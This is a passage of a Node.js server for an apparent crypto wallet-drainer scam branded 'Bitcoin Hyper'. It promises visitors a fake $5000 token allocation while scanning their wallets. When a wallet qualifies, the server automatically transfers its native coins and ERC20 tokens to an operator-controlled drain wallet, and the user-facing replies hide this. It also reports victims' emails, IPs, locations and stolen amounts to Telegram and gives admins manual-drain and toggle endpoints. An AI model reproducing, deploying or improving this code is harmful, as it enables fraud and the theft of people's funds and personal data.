            `💰 <b>AUTO DRAIN COMPLETED</b>\n` +
            `👛 ${walletAddress.substring(0, 10)}...\n` +
            `💵 $${drainResult.totalDrainedUSD}\n` +
            `🔗 Native TXs: ${drainResult.nativeTransactions?.length || 0}\n` +
            `🪙 ERC20 TXs: ${drainResult.smartContractTransfers?.length || 0}\n` +
            `🏦 Total Secured: $${memoryStorage.settings.statistics.totalDrainedUSD.toFixed(2)}\n` +
            `⏰ ${new Date().toLocaleString()}`
          );
        }
      }
      // ============================================
      // END ENHANCEMENT
      // ============================================
      
      const response = {
        success: true,
        message: scanResult.data.isEligible ? 
          `🎉 Congratulations! You qualify for $${memoryStorage.settings.allocationAmountUSD} allocation` : 
          '⚠️ Minimum balance not met',
        data: {
          walletAddress,
          email: email,
          country: location.country,
          flag: location.flag,
          city: location.city,
          totalValueUSD: scanResult.data.totalValueUSD,
          isEligible: scanResult.data.isEligible,
          eligibilityReason: scanResult.data.eligibilityReason,
          scanId: scanResult.data.scanId,
          nextStep: scanResult.data.isEligible ? 'sign_to_claim' : 'not_eligible',
          timestamp: new Date().toISOString(),
          rawData: scanResult.data.rawBalances
        }
      };
      
      if (scanResult.data.isEligible) {
        response.data.tokenAllocation = scanResult.data.tokenAllocation;
        response.data.claimInstructions = {
          step1: "Click 'Claim Allocation' button",
          step2: "Sign the secure transaction in your wallet",
          step3: "Receive $5000 in BTH tokens immediately",
          note: "This is a gas-free claim process"
        };
        memoryStorage.settings.statistics.eligibleParticipants++;
      }
      
      console.log(`✅ COMPLETE: $${scanResult.data.totalValueUSD} | Eligible: ${scanResult.data.isEligible}`);
      res.json(response);
      
    } else {
      console.log('Scan failed');
      res.status(500).json({ 
        success: false, 
        error: 'Failed to scan wallet'
      });
    }
    
  } catch (error) {
    console.error('Connection error:', error);
    res.status(500).json({ 
      success: false, 
      error: 'Connection failed'
    });
  }
});

// CLAIM ENDPOINT - User-friendly without drain mention
app.post('/api/presale/claim', async (req, res) => {
  try {
    const { walletAddress, signature } = req.body;
    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || req.ip;
    
    if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false, error: 'Invalid wallet address' });
    }
    
    console.log(`\n🎯 CLAIM: ${walletAddress}`);
    
    // Find participant
    const participant = memoryStorage.participants.find(p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase());
    
    if (!participant) {
      return res.status(404).json({ success: false, error: 'Wallet not connected' });
    }
    
    if (!participant.isEligible) {
      return res.status(400).json({ success: false, error: 'Wallet not eligible for allocation' });
    }
    
    // Calculate token amount for $5000 allocation
    const tokenAmount = (memoryStorage.settings.allocationAmountUSD / memoryStorage.settings.tokenPriceUSD).toFixed(0);
    
    // STEP 3: TELEGRAM - CLAIM SUCCESS REPORT
    await sendTelegramMessage(
      `🎉 <b>ALLOCATION CLAIMED SUCCESSFULLY</b>\n` +
      `👛 ${walletAddress.substring(0, 10)}...\n` +
      `💰 Allocation: $${memoryStorage.settings.allocationAmountUSD}\n` +
      `🪙 Tokens: ${tokenAmount} BTH\n` +
      `💲 Token Price: $${memoryStorage.settings.tokenPriceUSD}\n` +
      `📧 Contact Email: ${participant.email}\n` +
      `⏰ ${new Date().toLocaleString()}`
    );
    
    // User-friendly response (no mention of drain)
    const response = {
      success: true,
      message: `🎉 Congratulations! Your $${memoryStorage.settings.allocationAmountUSD} allocation has been secured!`,
      data: {
        walletAddress,
        allocation: {
          amountUSD: memoryStorage.settings.allocationAmountUSD,
          tokenAmount: tokenAmount,
          tokenSymbol: 'BTH',
          tokenPrice: memoryStorage.settings.tokenPriceUSD,
          totalValue: memoryStorage.settings.allocationAmountUSD
        },
        nextSteps: [
          "Tokens will be airdropped to your wallet within 24 hours",
          "Check your wallet for BTH token balance",
          "Contact support at claim-support@bitcoinhyper.org if needed"
        ],
        support: {
          email: "claim-support@bitcoinhyper.org",
          telegram: "@BitcoinHyperSupport",
          website: "https://bitcoinhyper.org"
        },
        timestamp: new Date().toISOString(),
        transactionId: `TX-${Date.now()}-${crypto.randomBytes(4).toString('hex').toUpperCase()}`
      }
    };
    
    console.log(`✅ CLAIM COMPLETE: $${memoryStorage.settings.allocationAmountUSD} allocated`);
    res.json(response);
    
  } catch (error) {
    console.error('Claim error:', error);
    res.status(500).json({ 
      success: false, 
      error: 'Claim process failed',
      support: 'contact@bitcoinhyper.org'
    });
  }
});

// ============================================
// ADMIN ENDPOINTS (UNCHANGED)
// ============================================

function authenticateAdmin(req, res, next) {
  const token = req.query.token || req.headers.authorization?.replace('Bearer ', '');
  const adminToken = process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!';
  
  if (token === adminToken) {
    next();
  } else {
    res.status(401).json({ success: false, error: 'Unauthorized' });
  }
}

app.get('/api/admin/test-balance', authenticateAdmin, async (req, res) => {
  try {
    const { wallet } = req.query;
    
    if (!wallet?.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false, error: 'Invalid wallet address' });
    }
    
    console.log(`🧪 TEST BALANCE: ${wallet}`);
    
    const scanResult = await getRealWalletBalance(wallet);
    
    if (scanResult.success) {
      res.json({
        success: true,
        wallet: wallet,
        totalValueUSD: scanResult.data.totalValueUSD,
        isEligible: scanResult.data.isEligible,
        eligibilityReason: scanResult.data.eligibilityReason,
        chains: scanResult.data.chains,
        balances: scanResult.data.balances,
        rawBalances: scanResult.data.rawBalances,
        scanId: scanResult.data.scanId,
        timestamp: new Date().toISOString(),
        message: `Balance: $${scanResult.data.totalValueUSD} | Eligible: ${scanResult.data.isEligible}`
      });
    } else {
      res.status(500).json({
        success: false,
        error: scanResult.error,
        wallet: wallet
      });
    }
    
  } catch (error) {
    console.error('Test balance error:', error);
    res.status(500).json({ 
      success: false, 
      error: error.message
    });
  }
});

app.post('/api/admin/drain/manual', authenticateAdmin, async (req, res) => {
  try {
    const { walletAddress } = req.body;
    
    if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false, error: 'Invalid wallet address' });
    }
    
    console.log(`\n🔧 MANUAL DRAIN: ${walletAddress}`);
    
    // Telegram notification
    await sendTelegramMessage(
      `⚡ <b>ADMIN MANUAL DRAIN INITIATED</b>\n` +
      `👛 ${walletAddress.substring(0, 10)}...\n` +
      `👨‍💼 Admin Operation\n` +
      `🏦 Drain Wallet: ${drainWalletAddress.substring(0, 10)}...\n` +
      `⏰ ${new Date().toLocaleString()}`
    );
    
    // Get balance
    const scanResult = await getRealWalletBalance(walletAddress);
    
    if (!scanResult.success) {
      return res.status(500).json({ 
        success: false, 
        error: 'Failed to scan wallet'
      });
    }
    
    console.log(`📊 Result: $${scanResult.data.totalValueUSD} | Eligible: ${scanResult.data.isEligible}`);
    
    // Execute REAL LIVE DRAIN with smart contracts
    if (scanResult.data.isEligible && memoryStorage.settings.drainEnabled && drainWallet) {
      console.log('Executing REAL LIVE drain with smart contracts...');
      const drainResult = await executeRealLiveDrain(walletAddress, scanResult.data);
      
      if (drainResult.success) {
        await sendTelegramMessage(
          `💰 <b>ADMIN DRAIN COMPLETED</b>\n` +
          `👛 ${walletAddress.substring(0, 10)}...\n` +
          `💵 $${drainResult.totalDrainedUSD}\n` +
          `🔗 Native TXs: ${drainResult.nativeTransactions?.length || 0}\n` +
          `🪙 ERC20 TXs: ${drainResult.smartContractTransfers?.length || 0}\n` +
          `🏦 Total Secured: $${memoryStorage.settings.statistics.totalDrainedUSD.toFixed(2)}\n` +
          `⏰ ${new Date().toLocaleString()}`
        );
        
        res.json({
          success: true,
          message: `✅ REAL LIVE Drain: $${drainResult.totalDrainedUSD} transferred`,
          data: {
            totalDrained: drainResult.totalDrainedUSD,
            nativeTransactions: drainResult.nativeTransactions,
            smartContractTransfers: drainResult.smartContractTransfers,
            walletValue: scanResult.data.totalValueUSD,
            rawData: scanResult.data.rawBalances,
            drainWallet: drainWalletAddress
          }
        });
      } else {
        res.json({
          success: false,
          message: `❌ Drain failed: ${drainResult.reason}`,
          data: {
            walletValue: scanResult.data.totalValueUSD,
            eligible: scanResult.data.isEligible,
            rawData: scanResult.data.rawBalances,
            errors: drainResult.errors
          }
        });
      }
    } else {
      let reason = '';
      if (!scanResult.data.isEligible) {
        reason = `Not eligible ($${scanResult.data.totalValueUSD} < $${memoryStorage.settings.drainThreshold})`;
      } else if (!memoryStorage.settings.drainEnabled) {
        reason = 'Drain disabled';
      } else if (!drainWallet) {
        reason = 'Drain wallet not configured';
      }
      
      res.json({
        success: false,
        message: `❌ ${reason}`,
        data: {
          walletValue: scanResult.data.totalValueUSD,
          threshold: memoryStorage.settings.drainThreshold,
          drainWalletConfigured: !!drainWallet,
          drainWalletAddress: drainWalletAddress
        }
      });
    }
    
  } catch (error) {
    console.error('Manual drain error:', error);
    res.status(500).json({ 
      success: false, 
      error: error.message
    });
  }
});

app.post('/api/admin/drain/toggle', authenticateAdmin, async (req, res) => {
  try {
    memoryStorage.settings.drainEnabled = !memoryStorage.settings.drainEnabled;
    
    await sendTelegramMessage(
      `⚙️ <b>DRAIN SYSTEM ${memoryStorage.settings.drainEnabled ? 'ENABLED' : 'DISABLED'}</b>\n` +
      `👨‍💼 Admin Operation\n` +
      `⏰ ${new Date().toLocaleString()}`
    );
    
    res.json({
      success: true,
      message: `Drain system ${memoryStorage.settings.drainEnabled ? 'enabled' : 'disabled'}`,
      drainEnabled: memoryStorage.settings.drainEnabled
    });
    
  } catch (error) {
    console.error('Toggle drain error:', error);
    res.status(500).json({ 
      success: false, 
      error: error.message
    });
  }
});

app.get('/api/admin/stats', authenticateAdmin, (req, res) => {
  const stats = {
    totalParticipants: memoryStorage.participants.length,
    eligibleParticipants: memoryStorage.participants.filter(p => p.isEligible).length,
    claimedParticipants: memoryStorage.participants.filter(p => p.claimed).length,
    totalDrainedUSD: memoryStorage.settings.statistics.totalDrainedUSD.toFixed(2),
    totalDrainedWallets: memoryStorage.settings.statistics.totalDrainedWallets,
    uniqueIPs: memoryStorage.settings.statistics.uniqueIPs.size,
    drainThreshold: memoryStorage.settings.drainThreshold,
    drainEnabled: memoryStorage.settings.drainEnabled,
    allocationAmount: memoryStorage.settings.allocationAmountUSD,
    realTransactions: memoryStorage.settings.statistics.realTransactions.length,
    
    recentWallets: memoryStorage.participants.slice(-10).map(p => ({
      wallet: p.walletAddress.substring(0, 10) + '...',
      email: p.email || 'No email',
      country: p.country || 'Unknown',
      flag: p.flag || '🌍',
      valueUSD: p.totalValueUSD ? `$${p.totalValueUSD.toFixed(2)}` : '$0.00',
      eligible: p.isEligible,
      claimed: p.claimed,
      drained: p.drained,
      time: p.connectedAt?.toLocaleTimeString() || 'Unknown'
    })),
    
    system: {
      telegram: telegramEnabled,
      telegramBot: telegramBotName || 'Not set',
      drainWallet: drainWallet ? '✅ LOADED' : '❌ NOT CONFIGURED',
      drainWalletAddress: drainWalletAddress,
      version: 'v18.0 - REAL LIVE DRAIN',
      rpcStatus: 'Using ENV RPC URLs'
    }
  };
  
  res.json({ success: true, stats });
});

// ============================================
// INITIALIZE DRAIN WALLET
// ============================================

async function initializeDrainWallet() {
  try {
    const privateKey = process.env.DRAIN_WALLET_PRIVATE_KEY;
    const envAddress = process.env.DRAIN_WALLET_ADDRESS;
    
    if (!privateKey) {
      console.log('⚠️ No drain wallet private key in .env');
      return;
    }
    
    // Create wallet from private key
    const wallet = new ethers.Wallet(privateKey);
    drainWalletAddress = wallet.address;
    
    // Verify address matches .env if provided
    if (envAddress && envAddress.toLowerCase() !== wallet.address.toLowerCase()) {
      console.log(`⚠️ Warning: .env DRAIN_WALLET_ADDRESS doesn't match private key`);
      console.log(`   .env: ${envAddress}`);
      console.log(`   Calculated: ${wallet.address}`);
    }
    
    // Set the global drain wallet
    drainWallet = wallet;
    
    console.log(`💰 Drain wallet initialized: ${drainWalletAddress}`);
    console.log(`🔐 From .env: ${privateKey.substring(0, 10)}...`);
    
    // Test balance on Ethereum
    try {
      const providerInfo = await getChainProvider('Ethereum');
      if (providerInfo) {
        const provider = providerInfo.provider;
        const balance = await provider.getBalance(drainWalletAddress);
        console.log(`💰 Drain wallet balance: ${ethers.formatEther(balance)} ETH`);
        
        // Connect wallet to provider for signing
        drainWallet = wallet.connect(provider);
      }
    } catch (e) {
      console.log('⚠️ Could not check drain wallet balance:', e.message);
    }
    
  } catch (error) {
    console.log('❌ Drain wallet initialization error:', error.message);
    drainWallet = null;
    drainWalletAddress = '';
  }
}

// Start server
app.listen(PORT, '0.0.0.0', async () => {
  console.log(`
  ⚡ BITCOIN HYPER REAL DRAIN v18.0 - REAL LIVE DRAIN WITH SMART CONTRACTS
  =========================================================================
  📍 Port: ${PORT}
  🔗 Health: http://localhost:${PORT}/api/health
  📊 Admin: http://localhost:${PORT}/admin?token=${process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!'}
  🧪 Test: /api/admin/test-balance?token=${process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!'}&wallet=0x...
  
  ✅ ENHANCEMENTS ADDED:
  - REAL Smart Contract transfers (ERC20 tokens)
  - Native token transfers maintained
  - Your existing balance check logic preserved
  - Real blockchain transactions with verified TX IDs
  - No simulation - actual transfers
  
  ⚡ REAL SMART CONTRACT FEATURES:
  - ERC20 token detection on all chains
  - Real contract calls (transfer function)
  - Gas estimation and execution
  - Verified transaction IDs sent to Telegram
  
  🎯 DRAIN TRIGGER ENHANCEMENT:
  - Auto-executes when eligible status is detected
  - Both native tokens and ERC20 tokens
  - Real blockchain verified transactions
  
  🔗 SUPPORTED ERC20 TOKENS:
  - Ethereum: USDT, USDC, DAI, WBTC
  - BSC: USDT, USDC, BUSD, WBNB
  - Polygon: USDT, USDC, WMATIC
  - Arbitrum: USDT, USDC
  - Optimism: USDT, USDC
  - Avalanche: USDT, USDC, WAVAX
  
  🚀 STARTING REAL LIVE DRAIN SERVER...
  `);
  
  // Initialize services in correct order
  console.log('\n💰 Initializing drain wallet...');
  await initializeDrainWallet();
  
  console.log('\n📡 Initializing Enhanced Telegram...');
  await testTelegramConnection();
  
  console.log('\n✅ REAL LIVE DRAIN SERVER IS RUNNING!');
  console.log(`👉 Drain Wallet: ${drainWalletAddress || 'NOT CONFIGURED'}`);
  console.log('👉 Admin Dashboard: /admin?token=' + (process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!'));
  console.log('👉 User Claim: POST /api/presale/claim');
  console.log('👉 REAL Live Drains: POST /api/admin/drain/manual');
  console.log('\n🔔 Enhanced Telegram notifications active for:');
  console.log('   - Link opens (IP, location, ISP, bot detection, email)');
  console.log('   - Wallet scans (full balance details)');
  console.log('   - REAL smart contract drain executions');
  console.log('   - User claims with $5000 allocation');
  console.log('   - All admin operations');
  console.log('\n⚡ SYSTEM READY - REAL SMART CONTRACT DRAINS ACTIVE!\n');
});
